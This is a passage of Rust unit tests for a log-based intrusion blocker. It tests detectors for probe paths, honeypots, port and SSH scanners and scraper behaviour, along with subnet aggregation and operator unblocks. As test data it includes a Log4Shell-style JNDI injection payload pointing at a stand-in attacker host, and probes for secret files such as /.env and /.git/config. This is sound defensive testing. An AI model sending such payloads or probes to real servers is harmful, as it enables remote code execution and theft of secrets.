        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// A detector that counts still convicts it: an operator checking
    /// something does not ask for seven missing pages.
    #[test]
    fn a_scan_from_an_address_that_logged_in_weeks_ago_is_still_blocked() {
        let db = logged_in_weeks_ago("198.51.100.9");
        let log: String = (0..10)
            .map(|i| not_found_line("198.51.100.9", &format!("/missing-{i}")))
            .collect();

        let outcome = block_web_scanners(&db, 7, 1, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["198.51.100.9"], "{outcome:?}");
    }

    /// The scheduled pass, from stored evidence: an ordinary answer
    /// stored beside the probe spares the address.
    #[test]
    fn the_scheduled_pass_blocks_a_protocol_prober_unless_it_was_also_answered() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        for ip in ["203.0.113.9", "198.51.100.4"] {
            let tls = Item::seen("tls handshake");
            observe(&db, Detector::ProtocolProbes, ip, tls, now - 60, 1);
        }
        observe(
            &db,
            Detector::ProtocolProbes,
            "198.51.100.4",
            Item::Clear,
            now - 30,
            1,
        );

        let outcome = run_detector(&db, Detector::ProtocolProbes, 5, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.9"], "{outcome:?}");
        assert_eq!(
            the_only_rule(&db).evidence.as_deref(),
            Some("sent a request not for a page: tls handshake")
        );
    }

    /// From the whole log, the block records the line itself.
    #[test]
    fn a_protocol_probe_s_block_records_what_was_sent() {
        let db = Db::open_in_memory().unwrap();
        let log = "203.0.113.9 - - [10/Oct/2026:13:55:36 +0000] \"\\x05\\x01\\x00\" 400 157 \"-\" \"-\"\n";

        block_protocol_probes(&db, 5, log, false).unwrap();

        assert_eq!(
            the_only_rule(&db).evidence.as_deref(),
            Some("socks handshake: \"\\x05\\x01\\x00\" 400")
        );
    }

    #[test]
    fn block_probe_paths_blocks_a_single_dotenv_request() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/.env");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(outcome.kind, ScanKind::ProbePath);
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        let rules = db.list_firewall_rules().unwrap();
        assert_eq!(rules[0].address, "203.0.113.9");
        assert!(rules[0].expires_at.is_some());
    }

    /// Behind Cloudflare, the address that asked for `/.env` is the edge
    /// every other visitor comes through too. Blocking it would block them
    /// all, so a detector leaves it alone and blocks the one that is not
    /// an edge — in both families.
    #[test]
    fn a_detector_never_blocks_a_cdn_edge_address() {
        let db = Db::open_in_memory().unwrap();
        let log = [
            probe_line("104.16.12.34", "/.env"),
            probe_line("2606:4700::6810:1", "/.env"),
            probe_line("203.0.113.9", "/.env"),
        ]
        .concat();

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert_eq!(outcome.skipped_known_crawlers, 2, "{outcome:?}");
        let blocked: Vec<String> = db
            .list_firewall_rules()
            .unwrap()
            .into_iter()
            .map(|rule| rule.address)
            .collect();
        assert_eq!(blocked, ["203.0.113.9"]);
    }

    #[test]
    fn block_probe_paths_ignores_ordinary_traffic() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/about");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(outcome.candidates, 0);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// Unlike spoofed-crawler detection this needs no fetched data, so it
    /// works on a completely fresh database.
    #[test]
    fn block_probe_paths_works_without_any_fetched_ranges() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/.git/config");
        assert_eq!(
            block_probe_paths(&db, 5, &log, false)
                .unwrap()
                .newly_blocked,
            vec!["203.0.113.9".to_string()]
        );
    }

    #[test]
    fn block_probe_paths_picks_up_extra_configured_paths() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/internal-only/dump");
        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 0);

        db.set_text_setting(crate::protection::PROBE_PATHS_EXTRA, "/internal-only")
            .unwrap();
        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 1);
    }

    #[test]
    fn block_probe_paths_blocks_the_wordpress_login_where_no_site_is_wordpress() {
        let db = Db::open_in_memory().unwrap();
        let _site = crate::testing::site_serving(&db, "example.com", &["index.html"]);
        let log = probe_line("203.0.113.9", "/wp-login.php");

        let outcome = block_probe_paths(&db, 5, &log, true).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
    }

    /// The property the whole feature rests on: an administrator signing
    /// in to their own WordPress is never a probe.
    #[test]
    fn block_probe_paths_never_blocks_the_login_of_a_wordpress_host() {
        let db = Db::open_in_memory().unwrap();
        let _site = crate::testing::site_serving(
            &db,
            "example.com",
            &["index.php", "wp-login.php", "wp-config.php"],
        );
        let log =
            probe_line("203.0.113.9", "/wp-login.php") + &probe_line("203.0.113.10", "/wp-admin/");

        let outcome = block_probe_paths(&db, 5, &log, true).unwrap();

        assert_eq!(outcome.candidates, 0, "{:?}", outcome.newly_blocked);
    }

    #[test]
    fn block_probe_paths_leaves_the_wordpress_login_alone_when_switched_off() {
        let db = Db::open_in_memory().unwrap();
        let _site = crate::testing::site_serving(&db, "example.com", &["index.html"]);
        crate::protection::set_app_probe_paths(&db, false).unwrap();
        let log = probe_line("203.0.113.9", "/wp-login.php");

        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 0);
    }

    #[test]
    fn block_probe_paths_dry_run_writes_nothing() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/.env");

        let outcome = block_probe_paths(&db, 5, &log, true).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    // ---- honeypot ----

    #[test]
    fn block_honeypot_blocks_a_fetch_of_the_default_trap_path() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", crate::protection::HONEYPOT_PATH_DEFAULT);

        let outcome = block_honeypot(&db, 30, &log, false).unwrap();

        assert_eq!(outcome.kind, ScanKind::Honeypot);
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert_eq!(outcome.summary(), "blocked 1 IP(s)");
    }

    #[test]
    fn block_honeypot_uses_a_configured_path() {
        let db = Db::open_in_memory().unwrap();
        db.set_text_setting(crate::protection::HONEYPOT_PATH, "/my-trap/")
            .unwrap();

        let default_hit = probe_line("203.0.113.9", crate::protection::HONEYPOT_PATH_DEFAULT);
        assert_eq!(
            block_honeypot(&db, 30, &default_hit, true)
                .unwrap()
                .candidates,
            0
        );

        let configured_hit = probe_line("203.0.113.9", "/my-trap/anything");
        assert_eq!(
            block_honeypot(&db, 30, &configured_hit, true)
                .unwrap()
                .candidates,
            1
        );
    }

    /// Matched as robots.txt matches it, from the start: a page that only
    /// mentions the trap further down its path did not ignore robots.txt.
    #[test]
    fn block_honeypot_matches_from_the_start_of_the_path() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/blog/stop-bots-trap/");
        assert_eq!(block_honeypot(&db, 30, &log, true).unwrap().candidates, 0);
    }

    #[test]
    fn block_honeypot_ignores_ordinary_traffic() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/");
        assert_eq!(block_honeypot(&db, 30, &log, false).unwrap().candidates, 0);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// The honeypot and probe-path detectors share one matcher, so this
    /// guards against the trap path accidentally being folded into the
    /// probe list (which would give it the wrong TTL and the wrong label).
    #[test]
    fn the_probe_path_detector_does_not_also_catch_the_honeypot() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", crate::protection::HONEYPOT_PATH_DEFAULT);
        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 0);
    }

    // ---- IPv6 /64 aggregation ----

    #[test]
    fn ipv4_addresses_are_blocked_exactly_as_observed() {
        assert_eq!(blockable_address("203.0.113.9"), "203.0.113.9");
    }

    #[test]
    fn ipv6_addresses_are_widened_to_their_64() {
        assert_eq!(
            blockable_address("2001:db8:1:2:aaaa:bbbb:cccc:dddd"),
            "2001:db8:1:2::/64"
        );
        assert_eq!(blockable_address("::1"), "::/64");
    }

    #[test]
    fn an_unparseable_address_passes_through_untouched() {
        // A detector must not silently lose a candidate because this
        // helper didn't recognise the string.
        assert_eq!(blockable_address("not-an-address"), "not-an-address");
        assert_eq!(blockable_address("1.2.3.0/24"), "1.2.3.0/24");
    }

    /// The point of the whole change: two different addresses in one /64
    /// are one block, not two — otherwise an attacker holding a /64 costs
    /// a firewall rule per request and is never actually stopped.
    #[test]
    fn two_addresses_in_one_ipv6_subnet_produce_a_single_block() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("2001:db8:1:2::1", "/.env") + &probe_line("2001:db8:1:2::2", "/.env");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["2001:db8:1:2::/64".to_string()]);
        assert_eq!(
            outcome.candidates, 1,
            "the two are one client, counted as one"
        );
        let rules = db.list_firewall_rules().unwrap();
        assert_eq!(rules.len(), 1, "rules were: {rules:?}");
        assert_eq!(rules[0].address, "2001:db8:1:2::/64");
    }

    /// A client that takes a new address in its /64 for every request is
    /// still one client: counted per address, none of these reached the
    /// limit, and the /64 was never blocked.
    #[test]
    fn missing_pages_asked_for_from_all_over_one_ipv6_subnet_add_up() {
        let db = Db::open_in_memory().unwrap();
        let log: String = (1..=8)
            .map(|n| not_found_line(&format!("2001:db8:1:2::{n}"), &format!("/missing-{n}")))
            .collect();

        let outcome = block_web_scanners(&db, 7, 1, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["2001:db8:1:2::/64".to_string()]);
    }

    /// NGINX on a dual-stack socket logs an IPv4 client in this form.
    #[test]
    fn an_ipv4_mapped_address_is_blocked_as_the_ipv4_address_it_is() {
        assert_eq!(blockable_address("::ffff:203.0.113.9"), "203.0.113.9");

        let db = Db::open_in_memory().unwrap();
        let log = probe_line("::ffff:203.0.113.9", "/.env");
        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
    }

    #[test]
    fn an_ipv4_mapped_private_address_is_left_alone_like_any_private_one() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("::ffff:10.0.0.9", "/.env");
        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 0);
    }

    #[test]
    fn addresses_in_different_ipv6_subnets_are_blocked_separately() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("2001:db8:1:2::1", "/.env") + &probe_line("2001:db8:1:3::1", "/.env");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(
            outcome.newly_blocked.len(),
            2,
            "{:?}",
            outcome.newly_blocked
        );
    }

    /// A /64 block covers far more than the address that was seen, so the
    /// lockout guard has to notice when the admin's own IPv6 session is
    /// inside it. This is the case where the widening could plausibly lock
    /// someone out, and the existing guard is what prevents it.
    #[test]
    fn the_lockout_check_sees_an_admin_inside_a_blocked_ipv6_64() {
        let rules = vec![crate::db::FirewallRule {
            id: 0,
            address: blockable_address("2001:db8:1:2::99"),
            port: None,
            action: FirewallAction::Block,
            enabled: true,
            expires_at: None,
            source: None,
            created_at: None,
            evidence: None,
        }];
        let connected = vec!["2001:db8:1:2::5".to_string()];

        let risks = crate::firewall::lockout_risks(&rules, &connected);

        assert_eq!(
            risks,
            vec![(
                "2001:db8:1:2::5".to_string(),
                "2001:db8:1:2::/64".to_string()
            )],
            "an admin connected from inside the blocked /64 must be flagged"
        );
    }

    // ---- behavioural detectors: the crawler exclusion ----

    fn page_line(ip: &str, path: &str) -> String {
        format!(
            "{ip} - - [10/Jul/2026:12:00:00 +0000] \"GET {path} HTTP/1.1\" 200 9 \"-\" \"UA\"\n"
        )
    }

    fn asset_less_log(ip: &str) -> String {
        (0..20).map(|i| page_line(ip, &format!("/p{i}"))).collect()
    }

    #[test]
    fn block_asset_ratio_blocks_a_client_that_never_fetches_assets() {
        let db = Db::open_in_memory().unwrap();
        let outcome =
            block_asset_ratio(&db, 5, &asset_less_log("203.0.113.9"), None, false).unwrap();

        assert_eq!(outcome.kind, ScanKind::NonBrowser);
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
    }

    /// The reason these three share `behavioural()`. Googlebot fetches no
    /// CSS, uses several user agents and sends no referer — it matches all
    /// three by design. Without the known-crawler exclusion these
    /// detectors would block search engines, which is the opposite of what
    /// this project is for.
    #[test]
    fn the_behavioural_detectors_never_block_a_verified_crawler() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        // An address inside Google's published range.
        let log = asset_less_log("66.249.66.1");

        let outcome = block_asset_ratio(&db, 5, &log, None, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
        assert_eq!(outcome.skipped_known_crawlers, 1);
        assert!(outcome.crawler_exclusion_active);
    }

    #[test]
    fn block_rotating_ua_respects_its_configured_threshold() {
        let db = Db::open_in_memory().unwrap();
        let log: String = (0..4)
            .map(|i| {
                format!(
                    "203.0.113.9 - - [10/Jul/2026:12:00:00 +0000] \"GET / HTTP/1.1\" 200 9 \"-\" \"A{i}\"\n"
                )
            })
            .collect();

        // Four agents, default threshold is higher.
        assert_eq!(
            block_rotating_ua(&db, 5, &log, None, true)
                .unwrap()
                .candidates,
            0
        );

        db.set_int_setting(crate::protection::ROTATING_UA_MIN, 3)
            .unwrap();
        assert_eq!(
            block_rotating_ua(&db, 5, &log, None, true)
                .unwrap()
                .candidates,
            1
        );
    }

    #[test]
    fn block_refererless_blocks_a_deep_crawl_with_no_referer() {
        let db = Db::open_in_memory().unwrap();
        let log: String = (0..30)
            .map(|i| page_line("203.0.113.9", &format!("/p{i}")))
            .collect();

        let outcome = block_refererless(&db, 5, &log, None, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
    }

    // ---- IPv4 /24 escalation ----

    fn probe_ip(ip: &str) -> String {
        probe_line(ip, "/.env")
    }

    #[test]
    fn escalation_is_off_unless_switched_on() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_ip("203.0.113.1") + &probe_ip("203.0.113.2") + &probe_ip("203.0.113.3");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(
            outcome.newly_blocked.len(),
            3,
            "{:?}",
            outcome.newly_blocked
        );
    }

    #[test]
    fn enough_neighbours_in_one_24_escalate_to_the_subnet() {
        let db = Db::open_in_memory().unwrap();
        db.set_bool_setting(crate::protection::SUBNET_ESCALATION, true)
            .unwrap();
        let log = probe_ip("203.0.113.1") + &probe_ip("203.0.113.2") + &probe_ip("203.0.113.3");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.0/24".to_string()]);
    }

    #[test]
    fn too_few_neighbours_are_left_as_individual_addresses() {
        let db = Db::open_in_memory().unwrap();
        db.set_bool_setting(crate::protection::SUBNET_ESCALATION, true)
            .unwrap();
        let log = probe_ip("203.0.113.1") + &probe_ip("203.0.113.2");

        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(
            outcome.newly_blocked,
            vec!["203.0.113.1".to_string(), "203.0.113.2".to_string()]
        );
    }

    /// Escalation is IPv4-only: IPv6 is already widened to its /64, and
    /// widening further would be a second, unasked-for escalation.
    #[test]
    fn escalation_leaves_ipv6_alone() {
        let escalated = escalate_subnets(
            vec![
                "2001:db8:1:2::/64".to_string(),
                "2001:db8:1:3::/64".to_string(),
                "2001:db8:1:4::/64".to_string(),
            ],
            3,
        );
        assert_eq!(escalated.len(), 3, "{escalated:?}");
    }

    #[test]
    fn escalation_only_groups_addresses_actually_in_the_same_24() {
        let escalated = escalate_subnets(
            vec![
                "203.0.113.1".to_string(),
                "203.0.113.2".to_string(),
                "203.0.113.3".to_string(),
                "198.51.100.7".to_string(),
            ],
            3,
        );
        assert_eq!(
            escalated,
            vec!["198.51.100.7".to_string(), "203.0.113.0/24".to_string()]
        );
    }

    // ---- detection from stored evidence ----

    use crate::evidence::{Evidence, Item};
    use crate::protection::Detector;

    /// Stores one observation, as a log pass would.
    fn observe(db: &Db, detector: Detector, ip: &str, item: Item, at: i64, times: u64) {
        let mut evidence = Evidence::default();
        for _ in 0..times {
            evidence.add(detector, ip.parse().unwrap(), item.clone(), at);
        }
        let from = db.get_log_cursor("test").unwrap();
        let to = format!("{}x", from.clone().unwrap_or_default());
        assert!(db
            .ingest(&crate::db::evidence::Ingested {
                source: "test",
                from: from.as_deref(),
                to: Some(&to),
                evidence: &evidence,
                user_agents: &HashMap::new(),
                logins: &[],
                now: at,
            })
            .unwrap());
    }

    /// `ip` tried each of `ports` once, at `at`, as the kernel log said.
    fn tried_ports(db: &Db, ip: &str, ports: &[u16], at: i64) {
        for port in ports {
            observe(
                db,
                Detector::PortScanners,
                ip,
                Item::seen(&port.to_string()),
                at,
                1,
            );
        }
    }

    /// Two different trap ports is a scan, by default; one port is not,
    /// however often; a stored threshold moves the line.
    #[test]
    fn a_port_scanner_is_blocked_at_its_threshold_of_distinct_trap_ports() {
        let cases: [(&str, &[u16], Option<i64>, bool); 5] = [
            ("one port", &[23], None, false),
            ("two ports", &[23, 445], None, true),
            ("many ports", &[23, 445, 3389, 5900], None, true),
            ("two ports, threshold three", &[23, 445], Some(3), false),
            (
                "three ports, threshold three",
                &[23, 445, 3389],
                Some(3),
                true,
            ),
        ];
        for (what, ports, threshold, blocked) in cases {
            let db = Db::open_in_memory().unwrap();
            if let Some(threshold) = threshold {
                Detector::PortScanners
                    .set_threshold(&db, threshold)
                    .unwrap();
            }
            let now = now_secs();
            tried_ports(&db, "203.0.113.5", ports, now - 60);

            let outcome = run_detector(&db, Detector::PortScanners, 5, now, false).unwrap();

            assert_eq!(
                !outcome.newly_blocked.is_empty(),
                blocked,
                "{what}: {outcome:?}"
            );
        }
    }

    /// The block says which ports, all of them, so whoever reads it can
    /// see it was a scan and not a client with the wrong address.
    #[test]
    fn a_port_scanner_s_block_records_every_trap_port_it_tried() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        tried_ports(&db, "203.0.113.5", &[3389, 23, 445], now - 60);

        run_detector(&db, Detector::PortScanners, 5, now, false).unwrap();

        let rule = db
            .list_firewall_rules()
            .unwrap()
            .into_iter()
            .find(|rule| rule.address == "203.0.113.5")
            .expect("not blocked");
        assert_eq!(
            rule.evidence.as_deref(),
            Some("new connections to trap ports 23, 445, 3389")
        );
        assert_eq!(
            rule.source,
            Some(RuleSource::Detector(Detector::PortScanners))
        );
    }

    fn probe_at(db: &Db, ip: &str, at: i64) {
        observe(db, Detector::ProbePaths, ip, Item::seen("/.env"), at, 1);
    }

    /// The bug windows exist to fix: a block expired, the lines that
    /// earned it were still there, and the next pass re-added it. Now the
    /// evidence is spent when the block is made, and only a new offence
    /// brings the block back.
    #[test]
    fn an_expired_block_comes_back_only_for_a_new_offence() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        probe_at(&db, "203.0.113.5", now - 60);

        // A block born expired: the quickest way to stand at the moment
        // one lapses.
        let first = run_detector(&db, Detector::ProbePaths, -1, now, false).unwrap();
        assert_eq!(first.newly_blocked, ["203.0.113.5"]);
        assert!(db.list_firewall_rules().unwrap().is_empty(), "expired");

        let again = run_detector(&db, Detector::ProbePaths, 5, now + 60, false).unwrap();
        assert!(
            again.newly_blocked.is_empty(),
            "the same old line re-added it: {again:?}"
        );

        probe_at(&db, "203.0.113.5", now + 120);
        let reoffended = run_detector(&db, Detector::ProbePaths, 5, now + 180, false).unwrap();
        assert_eq!(reoffended.newly_blocked, ["203.0.113.5"]);
    }

    /// A block some other way (by hand, or a detector before this one)
    /// answers for what came before it too.
    #[test]
    fn an_address_already_blocked_keeps_only_what_it_did_after_the_block() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        probe_at(&db, "203.0.113.5", now - 3600);
        db.add_firewall_rule(&NewFirewallRule {
            address: "203.0.113.5".to_string(),
            port: None,
            action: FirewallAction::Block,
            source: crate::db::RuleSource::Cli,
            evidence: None,
        })
        .unwrap();

        let covered = run_detector(&db, Detector::ProbePaths, 5, now, false).unwrap();
        assert_eq!(covered.already_covered, 1);

        let id = db.list_firewall_rules().unwrap()[0].id;
        db.remove_firewall_rule(id).unwrap();
        let after = run_detector(&db, Detector::ProbePaths, 5, now + 60, false).unwrap();
        assert!(
            after.newly_blocked.is_empty(),
            "blocked again for what it did before the first block: {after:?}"
        );
    }

    /// A dry run changes nothing, the evidence included.
    #[test]
    fn a_dry_run_leaves_the_evidence_for_the_real_one() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        probe_at(&db, "203.0.113.5", now - 60);

        run_detector(&db, Detector::ProbePaths, 5, now, true).unwrap();
        let real = run_detector(&db, Detector::ProbePaths, 5, now, false).unwrap();

        assert_eq!(real.newly_blocked, ["203.0.113.5"]);
    }

    /// Twenty failed logins within a day, not twenty since the log began.
    #[test]
    fn the_ssh_scanner_counts_only_failures_inside_its_window() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        let failures = |ip: &str, at: i64, times: u64| {
            observe(&db, Detector::SshScanners, ip, Item::bucket(at), at, times)
        };
        failures("203.0.113.5", now - 2 * 86_400, 15);
        failures("203.0.113.5", now - 600, 10);
        failures("198.51.100.7", now - 1_200, 12);
        failures("198.51.100.7", now - 600, 12);

        let outcome = run_detector(&db, Detector::SshScanners, 5, now, false).unwrap();

        assert_eq!(
            outcome.newly_blocked,
            ["198.51.100.7"],
            "25 lines, 15 of them two days old, is 10 inside the window"
        );
    }

    /// Distinct 404s add up across passes: seven paths are seven paths,
    /// however many reads it took to see them.
    #[test]
    fn evidence_from_several_passes_adds_up_to_a_threshold() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        for n in 0..4 {
            let path = format!("/a{n}");
            observe(
                &db,
                Detector::WebScanners,
                "203.0.113.5",
                Item::seen(&path),
                now - 300,
                1,
            );
        }
        assert!(run_detector(&db, Detector::WebScanners, 1, now, false)
            .unwrap()
            .newly_blocked
            .is_empty());

        for n in 4..7 {
            let path = format!("/a{n}");
            observe(
                &db,
                Detector::WebScanners,
                "203.0.113.5",
                Item::seen(&path),
                now - 60,
                1,
            );
        }
        let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
        assert_eq!(outcome.newly_blocked, ["203.0.113.5"]);
    }

    /// The behavioural detectors look back an hour: fifteen pages spread
    /// over an afternoon is a reader, not a scraper.
    #[test]
    fn a_behavioural_detector_forgets_after_its_hour() {
        let db = Db::open_in_memory().unwrap();
        Detector::AssetRatio.set_enabled(&db, true).unwrap();
        let now = now_secs();
        for n in 0..20 {
            let path = format!("/page{n}");
            let at = now - 2 * 3600 + n * 60;
            observe(
                &db,
                Detector::AssetRatio,
                "203.0.113.5",
                Item::seen(&path),
                at,
                1,
            );
        }

        let outcome = run_detector(&db, Detector::AssetRatio, 5, now, false).unwrap();

        assert_eq!(outcome.candidates, 0, "{outcome:?}");
    }

    /// A forged Googlebot is judged against Google's ranges as they are
    /// now, not as they were when the line was read.
    #[test]
    fn a_crawler_that_publishes_the_address_since_is_not_blocked() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        let now = now_secs();
        observe(
            &db,
            Detector::SpoofedCrawlers,
            "203.0.113.9",
            Item::seen("Googlebot IP ranges"),
            now - 60,
            1,
        );
        db.replace_ip_ranges(
            "googlebot",
            &["66.249.64.0/19".to_string(), "203.0.113.0/24".to_string()],
        )
        .unwrap();

        let outcome = run_detector(&db, Detector::SpoofedCrawlers, 1, now, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
    }

    /// An escalated /24 spends the evidence of every neighbour in it.
    #[test]
    fn an_escalated_block_spends_every_neighbour_s_evidence() {
        let db = Db::open_in_memory().unwrap();
        db.set_bool_setting(crate::protection::SUBNET_ESCALATION, true)
            .unwrap();
        let now = now_secs();
        for ip in ["203.0.113.1", "203.0.113.2", "203.0.113.3"] {
            probe_at(&db, ip, now - 60);
        }

        let outcome = run_detector(&db, Detector::ProbePaths, -1, now, false).unwrap();
        assert_eq!(outcome.newly_blocked, ["203.0.113.0/24"]);

        assert!(
            db.evidence_rows(Detector::ProbePaths, 0, Rule::Once)
                .unwrap()
                .is_empty(),
            "the /24 answered for all three"
        );
    }

    /// The index a pass builds once says what asking every flagged address
    /// would, for every shape of block a pass writes.
    #[test]
    fn each_block_answers_for_the_addresses_inside_it() {
        let flagged: Vec<String> = [
            "203.0.113.1",
            "203.0.113.2",
            "198.51.100.7",
            "2001:db8::1",
            "2001:db8::2",
            "2001:db8:0:1::1",
        ]
        .map(String::from)
        .to_vec();
        let index = answered_by(&flagged);

        for block in [
            "203.0.113.1",
            "203.0.113.0/24",
            "198.51.100.7",
            "2001:db8::/64",
            "2001:db8:0:1::/64",
        ] {
            assert_eq!(
                index.get(block),
                Some(&observed_in(&flagged, block)),
                "block {block}"
            );
        }
    }

    // ---- what a detector's block records ----

    fn the_only_rule(db: &Db) -> crate::db::FirewallRule {
        let rules = db.list_firewall_rules().unwrap();
        assert_eq!(rules.len(), 1, "{rules:?}");
        rules.into_iter().next().unwrap()
    }

    /// The question the Blocks views answer: which detector, and what did
    /// the address send.
    #[test]
    fn a_detector_s_block_names_the_detector_and_the_request_that_triggered_it() {
        let db = Db::open_in_memory().unwrap();
        let log = [
            probe_line("203.0.113.5", "/"),
            probe_line("203.0.113.5", "/.git/config"),
        ]
        .concat();

        block_probe_paths(&db, 1, &log, false).unwrap();

        let rule = the_only_rule(&db);
        assert_eq!(
            rule.source,
            Some(RuleSource::Detector(Detector::ProbePaths))
        );
        let evidence = rule.evidence.unwrap_or_default();
        assert!(
            evidence.contains("/.git/config"),
            "evidence was {evidence:?}"
        );
        assert!(rule.created_at.is_some());
    }

    #[test]
    fn an_injection_block_names_the_payload_it_found() {
        let db = Db::open_in_memory().unwrap();
        let log = request_line(
            "203.0.113.9",
            "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1",
            "Mozilla/5.0",
        );

        block_injection(&db, 7, &log, false).unwrap();

        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
        let signature =
            crate::injection::in_request("GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1")
                .expect("the payload is one the detector knows");
        assert!(
            evidence.starts_with(signature) && evidence.contains("${jndi:"),
            "evidence was {evidence:?}"
        );
    }

    #[test]
    fn an_ssh_scanner_s_block_carries_its_failed_login_line() {
        let db = Db::open_in_memory().unwrap();
        let log = ssh_failed_attempt("198.51.100.8", 25);

        block_ssh_scanners(&db, 20, 1, &log, false).unwrap();

        let rule = the_only_rule(&db);
        assert_eq!(
            rule.source,
            Some(RuleSource::Detector(Detector::SshScanners))
        );
        assert_eq!(
            rule.evidence.as_deref(),
            Some("Failed password for root from 198.51.100.8 port 4444 ssh2")
        );
    }

    /// A /64 is stored, but the line names the address that was seen.
    #[test]
    fn a_widened_ipv6_block_still_finds_the_line_of_the_address_inside_it() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("2001:db8:1:2::99", "/.env");

        block_probe_paths(&db, 1, &log, false).unwrap();

        let rule = the_only_rule(&db);
        assert_eq!(rule.address, "2001:db8:1:2::/64");
        assert!(
            rule.evidence.unwrap_or_default().contains("/.env"),
            "the evidence belongs to the address inside the /64"
        );
    }

    /// Attacker text is stored as one inert line.
    #[test]
    fn a_hostile_request_is_stored_without_its_control_characters() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.5", "/.env\x1b[2J\x07");

        block_probe_paths(&db, 1, &log, false).unwrap();

        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
        assert!(
            !evidence.chars().any(char::is_control),
            "evidence was {evidence:?}"
        );
    }

    /// The operator's unblock has to outlast the log lines that earned the
    /// block, or the next tick undoes it.
    #[test]
    fn an_address_unblocked_by_hand_is_not_blocked_again_from_the_same_log() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.5", "/.env");
        block_probe_paths(&db, 1, &log, false).unwrap();
        db.unblock_address("203.0.113.5").unwrap();

        let outcome = block_probe_paths(&db, 1, &log, false).unwrap();

        assert!(db.list_firewall_rules().unwrap().is_empty());
        assert_eq!(outcome.skipped_unblocked, 1, "{outcome:?}");
        assert_eq!(
            outcome.summary(),
            "found 1 probing IP(s), all unblocked by hand — left alone"
        );
    }

    /// Only that address: the detector keeps working for everyone else.
    #[test]
    fn an_unblock_leaves_every_other_address_to_the_detector() {
        let db = Db::open_in_memory().unwrap();
        block_probe_paths(&db, 1, &probe_line("203.0.113.5", "/.env"), false).unwrap();
        db.unblock_address("203.0.113.5").unwrap();

        let log = [
            probe_line("203.0.113.5", "/.env"),
            probe_line("203.0.113.6", "/.env"),
        ]
        .concat();
        let outcome = block_probe_paths(&db, 1, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.6"]);
    }

    /// The scheduled pass has no log text, only what the stored evidence
    /// kept; the block names that.
    #[test]
    fn a_scheduled_block_records_what_the_stored_evidence_kept() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        probe_at(&db, "203.0.113.5", now - 60);

        run_detector(&db, Detector::ProbePaths, 1, now, false).unwrap();

        let rule = the_only_rule(&db);
        assert_eq!(
            rule.source,
            Some(RuleSource::Detector(Detector::ProbePaths))
        );
